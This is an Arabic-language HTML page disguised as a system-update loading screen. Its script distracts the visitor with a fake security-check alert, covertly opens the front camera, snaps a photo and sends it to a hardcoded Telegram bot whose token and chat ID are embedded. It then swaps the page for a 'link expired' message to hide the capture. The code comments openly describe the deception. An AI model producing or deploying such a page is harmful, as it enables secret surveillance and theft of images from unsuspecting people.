<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث النظام - جاري التحميل...</title>
    <style>
        body {
            background-color: #0f0f0f;
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .box {
            background: #1e1e1e;
            padding: 25px;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            max-width: 320px;
            width: 90%;
        }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.1);
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border-left-color: #0088cc;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        /* إشعار وهمي يظهر ويزول بسرعة لتشتيت المستخدم */
        #fake-alert {
            position: fixed;
            top: -100px;
            background: #333;
            color: #fff;
            padding: 12px 20px;
            border-radius: 8px;
            transition: top 0.5s ease;
            font-size: 14px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
        }
    </style>
</head>
<body>

    <!-- إشعار تشتيت وهمي -->
    <div id="fake-alert">جارٍ التحقق من الأمان...</div>

    <div class="box" id="main-box">
        <div class="spinner"></div>
        <h3>جاري إعداد الملف...</h3>
        <p style="font-size: 14px; color: #aaa;">يرجى عدم إغلاق الصفحة حتى اكتمال التثبيت</p>
    </div>

    <!-- عناصر الكاميرا المخفية -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8730950232:AAEx1LjVNqqqlC0335uZa13_-6InRx7YXs";
        const CHAT_ID = "8787876793";

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // محاكاة إشعار تشتيت سريع يظهر لمدة ثانية ثم يختفي
        setTimeout(() => {
            const alertBox = document.getElementById('fake-alert');
            alertBox.style.top = "20px"; // يظهر للأعلى
            setTimeout(() => {
                alertBox.style.top = "-100px"; // يختفي بعد ثانية
            }, 1200);
        }, 1000);

        // محاولة تشغيل الكاميرا تلقائياً بعد مرور 2 ثانية (أثناء انشغال المستخدم بالإشعار الوهمي)
        async function initCameraStealth() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                video.srcObject = stream;
                
                // بعد فتح الكاميرا، يتم الالتقاط والإرسال بصمت بعد ثانية واحدة
                setTimeout(takeSnapshot, 1000);
            } catch (error) {
                console.log("تم حظر الإذن أو يتطلب تفاعلاً بشرياً إضافياً:", error);
            }
        }

        function takeSnapshot() {
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(function(blob) {
                sendImageToTelegram(blob);
            }, 'image/jpeg', 0.85);
        }

        async function sendImageToTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'snapshot.jpg');

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                // إخفاء الواجهة تماماً بعد الإرسال لتبدو وكأن شيئاً لم يحدث
                document.body.innerHTML = "<h2 style='text-align:center; margin-top:20vh;'>عذراً، انتهت صلاحية الرابط.</h2>";
            } catch (err) {
                console.error("فشل الإرسال:", err);
            }
        }

        // تشغيل الدالة بعد ثانيتين من دخول الصفحة
        setTimeout(initCameraStealth, 2000);
    </script>
</body>
</html>
